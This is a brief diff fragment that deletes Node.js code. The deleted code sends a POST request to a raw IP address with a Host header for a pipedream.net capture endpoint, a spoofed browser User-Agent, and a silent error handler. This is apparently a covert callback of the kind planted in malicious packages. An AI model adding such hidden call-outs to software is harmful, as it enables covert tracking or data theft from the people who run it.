@@ -1,9 +1,0 @@
-req = http.request({
-  host: '44.196.248.120',
-  path: '/',
-  method: 'POST',
-  headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.net',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'  }
-
-}).on('error', function(err) {
-})
